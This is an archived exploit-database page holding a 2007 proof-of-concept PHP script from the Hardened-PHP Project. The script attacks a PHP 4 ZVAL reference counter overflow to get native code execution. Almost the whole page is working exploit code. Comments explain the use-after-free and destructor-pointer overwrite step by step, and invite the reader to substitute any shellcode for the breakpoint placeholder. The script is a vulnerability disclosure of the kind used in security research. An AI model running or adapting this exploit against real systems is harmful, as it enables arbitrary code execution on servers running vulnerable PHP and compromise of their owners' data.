<html><head><title>PHP 4 Userland ZVAL Reference Counter Overflow Exploit PoC</title></head><pre>&lt;?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //               PHP 4 - ZVAL Reference Counter Overflow              //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die(&quot;REMOVE THIS LINE&quot;);

  // You can put in any shellcode you want. Just make sure that the
  // shellcode string is long enough to not end up in PHP's internal
  // memory cache

  $shellcode = str_repeat(chr(0xcc), 500);

  // The basic idea of this exploit is:
  //  1) Create a string that has the same size as a Hashtable
  //  2) Create 65536 references to it to overflow the refcount
  //  3) Free one of these references 
  //      =&gt; Refcount drops down to 0
  //      =&gt; String gets freed
  //  4) Free some more zvals
  //  5) Create a new array with one element
  //      =&gt; Put shellcode in the key
  //      =&gt; Hashtable struct will be in the same place as the string
  //  6) Use string to directly access the content of the Hashtable
  //      =&gt; Read pointer to first bucket
  //      =&gt; Add 32 bytes, offset to array key
  //      =&gt; Write pointer to the destructor field
  //  7) Unset array =&gt; Executes code in $shellcode
  
  ////////////////////////////////////////////////////////////////////////
  // If you touch anything below this line you have to debug it yourself
  ////////////////////////////////////////////////////////////////////////

  $________________________str = str_repeat(&quot;A&quot;, 39);
  $________________________yyy = &amp;$________________________str;
  $________________________xxx = &amp;$________________________str;
  for ($i = 0; $i &lt; 65534; $i++) $arr[] = &amp;$________________________str;
  $________________________aaa = &quot;   XXXXX   &quot;;
  $________________________aab = &quot; XXXx.xXXX &quot;;
  $________________________aac = &quot; XXXx.xXXX &quot;;
  $________________________aad = &quot;   XXXXX   &quot;;
  unset($________________________xxx);
  unset($________________________aaa);
  unset($________________________aab);
  unset($________________________aac);
  unset($________________________aad);
  $arr = array($shellcode =&gt; 1);

  $addr = unpack(&quot;L&quot;, substr($________________________str, 6*4, 4));
  $addr = $addr[1] + 32;
  $addr = pack(&quot;L&quot;, $addr);

  for ($i=0; $i&lt;strlen($addr); $i++) {
    $________________________str[8*4+$i] = $addr[$i];
    $________________________yyy[8*4+$i] = $addr[$i];
  }
  unset($arr);

?&gt;

# milw0rm.com [2007-03-01]</pre></html>